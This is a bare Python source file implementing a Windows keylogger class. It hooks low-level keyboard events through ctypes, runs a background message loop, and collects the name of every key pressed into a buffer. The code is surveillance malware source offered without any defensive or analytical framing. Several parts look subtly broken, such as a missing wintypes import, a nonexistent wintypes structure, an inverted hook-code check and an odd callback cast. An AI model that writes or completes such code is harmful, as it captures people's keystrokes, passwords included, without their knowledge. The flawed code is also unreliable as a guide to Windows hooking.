import ctypes
import threading

class Keylogger:
    def __init__(self):
        self.is_logging = False
        self.keylog_buffer = bytearray()
        self.h_keyhook = None

    def start_logger(self):
        if self.is_logging:
            return True

        self.h_keyhook = ctypes.windll.user32.SetWindowsHookExA(
            ctypes.c_int(13),
            ctypes.cast(ctypes.CFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.c_int) (self.key_event), ctypes.py_object),
            ctypes.c_int(0),
            ctypes.c_int(0)
        )

        if not self.h_keyhook:
            return False

        self.is_logging = True
        threading.Thread(target=self.msg_loop, args=(), daemon=True).start()
        return True

    def stop_logger(self):
        if not self.is_logging:
            return True

        self.is_logging = False
        ctypes.windll.user32.UnhookWindowsHookEx(self.h_keyhook)
        self.h_keyhook = None
        return True

    def msg_loop(self):
        while self.is_logging:
            message = ctypes.wintypes.MSG()
            has_message = ctypes.windll.user32.GetMessageA(
                ctypes.byref(message),
                ctypes.c_int(0),
                ctypes.c_int(0),
                ctypes.c_int(0)
            )

            if has_message:
                ctypes.windll.user32.TranslateMessage(ctypes.byref(message))
                ctypes.windll.user32.DispatchMessageA(ctypes.byref(message))

    def key_event(self, n_code, w_param, l_param):
        if n_code == 0 or w_param not in [0x100, 0x104]:
            return ctypes.windll.user32.CallNextHookEx(self.h_keyhook, n_code, w_param, l_param)

        kb_hook = ctypes.cast(l_param, ctypes.POINTER(ctypes.wintypes.KBDLLHOOKSTRUCT)).contents
        dw_msg = kb_hook.vkCode | kb_hook.scanCode << 16 | kb_hook.flags << 24
        key_name = ctypes.create_string_buffer(256)
        key_name_len = ctypes.windll.user32.GetKeyNameTextA(dw_msg, key_name, 256)

        if key_name_len == 1:
            key_name_len = 0

        if key_name_len > 1 and key_name.value.startswith(b"Enter"):
            key_name_len += 3
            key_name.value = b"[Enter]\n" + key_name.value
        elif key_name_len > 1 and key_name.value.startswith(b"Backspace"):
            key_name_len = -1
        elif key_name_len > 1 and key_name.value.startswith(b"Space"):
            key_name_len = 1
            key_name.value = b" "

        if key_name_len > 0:
            self.keylog_buffer += key_name.value[:key_name_len]

        return ctypes.windll.user32.CallNextHookEx(self.h_keyhook, n_code, w_param, l_param)

